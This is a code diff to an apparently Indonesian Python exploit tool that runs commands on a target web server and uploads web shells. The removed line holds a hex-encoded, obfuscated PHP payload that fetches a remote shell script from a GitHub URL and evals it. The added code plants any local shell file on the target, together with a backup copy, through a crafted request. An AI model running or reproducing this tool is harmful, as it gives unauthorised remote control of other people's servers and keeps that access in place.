@@ -33,6 +33,12 @@ def clear():
     except Exception as e:
         print("Terjadi Kesalahan.", e)
 
+def typing(words):
+    for char in words:
+        time.sleep(0.1)
+        sys.stdout.write(char)
+        sys.stdout.flush()
+
 def NuLzCMD(target):
     while True:
         input_cmd = input('CMD ~$: ')
@@ -52,10 +58,26 @@ def NuLzUPSHELL(target):
     match = pattern.search(url)
     if match:
         shell_url = pattern.sub(r'PHP/nulz.php', url)
+        backup_url = pattern.sub(r'PHP/nulz-backup.php', url)
     else:
         print("Terjadi Kesalahan, Mohon Periksa URL Target Anda.")
 
-    payload = "<?php $upshell = file_put_contents('nulz.php', hex2bin('3c3f3d2f2a2a2a2a2f402f2a35353535352a2f6e756c6c3b202f2a2a2a2a2a2a2f402f2a35353535352a2f6576616c2f2a2a2a2a2a2a2f28223f3e222e66696c655f6765745f636f6e74656e7473282268747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6861786f7273746172732f617263686976652f6d61696e2f616c66612f616c66612d67672e7068702229292f2a2a2a2a2a2a2f202f2a4279204e754c7a3430342a2f3f3e'));if ($upshell) {echo 'Upload Shell Success, shell name => nulz.php'.PHP_EOL;echo '"+shell_url+"';} else {echo 'Upload Shell Failed :(';}?>"
+    print("Your Shell Path In Your Device! Example: /documents/myshell/shell.php")
+    inputshell = input("Shell Path >: ")
+    getshell = open(inputshell, 'r').read()
+    shellcontent = getshell.encode().hex()
+    print("Shell Name To Upload! Example: nulz.php")
+    shellname = input("Upload Shell Name >: ")
+    print("Shell Name To Backup Upload! Example: nulz-backup.php")
+    shellbackup = input("Backup Shell Name >: ")
+    if match:
+        shell_url = pattern.sub(r'PHP/{}.php'.format(shellname), url)
+        backup_url = pattern.sub(r'PHP/{}.php'.format(shellbackup), url)
+    else:
+        print("Terjadi Kesalahan, Mohon Periksa URL Target Anda.")
+
+    typing('Exploiting The Target...\n')
+    payload = "<?php $upshell=file_put_contents('"+shellname+"',hex2bin('"+shellcontent+"'));if($upshell){echo 'Upload Shell Success, shell name => "+shellname+"'.PHP_EOL;echo '"+shell_url+"';}else{echo 'Upload Shell Failed :(';}echo PHP_EOL;$getshell=fopen('"+shellbackup+"','w');$backupshell=fwrite($getshell,hex2bin('"+shellcontent+"'));if($backupshell){fclose($getshell);echo 'Backup Shell Success, backup name => "+shellbackup+"'.PHP_EOL;echo '"+backup_url+"';}else{fclose($getshell);echo 'Upload Shell Failed :(';} ?>"
     req = requests.get(target, data=payload)
     res = req.text
     print(res)
@@ -71,7 +93,7 @@ def NuLzGG():
 [ Select Option ]
 --------------------------
 [1] RCE (Command)
-[2] UPSHELL (Upload Shell)
+[2] UPSHELL (Upload Shell in Current Dir)
 --------------------------
         ''')
             select_payload = input("Select >: ")
